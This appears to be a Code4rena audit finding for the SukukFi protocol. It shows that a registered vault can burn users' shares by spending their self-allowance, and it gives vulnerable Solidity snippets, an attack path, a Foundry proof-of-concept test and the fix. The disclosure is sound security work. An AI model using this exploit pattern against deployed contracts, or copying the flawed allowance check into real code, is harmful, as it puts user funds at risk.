# [HIGH] Vaults can burn user shares without user approval after self-allowance is set

```text
id         : W3-003
protocol   : SukukFi
platform   : Code4rena audit 2025-11-sukukfi, submission S-310 (as duan)
severity   : high
class      : access control / wrong allowance spender
status     : confirmed — included in the final report as H-01
audit      : 2025-11-26 → 2025-12-05
repo       : code-423n4/2025-11-sukukfi
```

- Original submission: <https://code4rena.com/audits/2025-11-sukukfi/submissions/S-310>
- Published report (H-01): <https://code4rena.com/reports/2025-11-sukukfi>

## Summary

`WERC7575ShareToken.spendSelfAllowance` decrements `allowance[owner][owner]` (the self-allowance) instead of `allowance[owner][msg.sender]`. Because vault-only burn flows call `spendSelfAllowance` + `burn`, any registered vault can consume a user's self-allowance and burn their shares even though the user never granted an owner → vault approval.

## Root cause

**Intended model.** Transfers and vault burns should require the user to pre-approve spending. The "self-allowance" is meant for the user's own actions (or a validator-signed permit), and a vault should need an explicit owner → vault allowance before it can burn or spend a user's shares.

**Actual behavior.** `spendSelfAllowance` spends the self-allowance regardless of which vault is calling:

```solidity
// src/WERC7575ShareToken.sol#L655-L662
/**
 * @dev Spends self allowance for an owner (vault-only operation)
 * @param owner The owner address to spend allowance for
 * @param shares The amount of shares to spend from allowance
 */
function spendSelfAllowance(address owner, uint256 shares) external onlyVaults {
    _spendAllowance(owner, owner, shares);
}
```

`burn` itself performs no allowance check; it only requires the caller to be a registered vault:

```solidity
// src/WERC7575ShareToken.sol#L371-L382
/**
 * @dev Burns share tokens from an address (vault-only operation)
 * @param from The address to burn tokens from
 * @param amount The amount of tokens to burn
 */
function burn(address from, uint256 amount) external onlyVaults whenNotPaused {
    if (from == address(0)) {
        revert IERC20Errors.ERC20InvalidSender(address(0));
    }
    if (!isKycVerified[from]) revert KycRequired();
    _burn(from, amount);
}
```

Affected code:

- [`WERC7575ShareToken.sol#L655-L662`](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575ShareToken.sol#L655-L662)
- [`WERC7575ShareToken.sol#L371-L382`](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575ShareToken.sol#L371-L382)

## Attack path

1. A user sets the self-allowance `allowance[user][user]`, which is required for any normal transfer.
2. A registered vault, which never received a user → vault allowance, calls `spendSelfAllowance(user, amount)`. This decrements `allowance[user][user]`, not `allowance[user][vault]`.
3. The same vault calls `burn(user, amount)`, which succeeds.

## Impact

Once a user sets the self-allowance required for any normal transfer, any vault can repeatedly destroy their balance without their consent.

## Proof of concept

The test deploys `WERC7575ShareToken` and a registered vault, mints shares to a user, simulates the user's self-allowance via storage (as would be set by permit), then shows the vault can call `spendSelfAllowance` + `burn` to destroy user funds without any owner → vault allowance.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {WERC7575ShareToken} from "../src/WERC7575ShareToken.sol";
import {WERC7575Vault} from "../src/WERC7575Vault.sol";
import {IERC20Errors} from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";

/**
 * @dev PoC: Any registered vault can burn user shares without having caller-specific allowance.
 * Root cause: spendSelfAllowance uses _spendAllowance(owner, owner, shares) instead of owner, msg.sender.
 */
contract VaultBurnsWithoutAllowanceTest is Test {
    WERC7575ShareToken internal share;
    WERC7575Vault internal vault;
    address internal user = address(0x2000);

    function setUp() external {
        // Deploy share token and vault (use share token as dummy asset for simplicity)
        share = new WERC7575ShareToken("Wrapped", "WRP");
        vault = new WERC7575Vault(address(share), share);

        // Register vault and KYC user
        vm.prank(share.owner());
        share.registerVault(address(share), address(vault));
        vm.prank(share.owner());
        share.setKycVerified(user, true);

        // Mint shares to user via vault
        vm.prank(address(vault));
        share.mint(user, 1_000 ether);
    }

    function testVaultBurnsWithoutOwnerApproval() external {
        // Simulate user self-allowance (permit would normally set allowance[user][user])
        _setSelfAllowance(user, type(uint256).max);

        // Vault never received owner->vault allowance, but can still burn using spendSelfAllowance bug
        vm.startPrank(address(vault));
        share.spendSelfAllowance(user, 500 ether); // decrements allowance[user][user], not allowance[user][vault]
        share.burn(user, 500 ether); // succeeds, burning user funds
        vm.stopPrank();

        // User balance reduced without granting vault any allowance
        assertEq(share.balanceOf(user), 500 ether, "vault burned user funds without owner->vault allowance");
    }

    // Manually set allowance[user][user] via storage to mimic a self-allowance
    function _setSelfAllowance(address owner, uint256 value) internal {
        // _allowances is slot 1 in OZ ERC20 storage layout
        bytes32 slotAllowances = bytes32(uint256(1));
        bytes32 slotOwner = keccak256(abi.encode(owner, slotAllowances));
        bytes32 slotSpender = keccak256(abi.encode(owner, slotOwner));
        vm.store(address(share), slotSpender, bytes32(value));
    }
}
```

## Fix

Change `_spendAllowance(owner, owner, shares)` to `_spendAllowance(owner, msg.sender, shares)`, so a vault can only consume what the user explicitly approved to that vault.
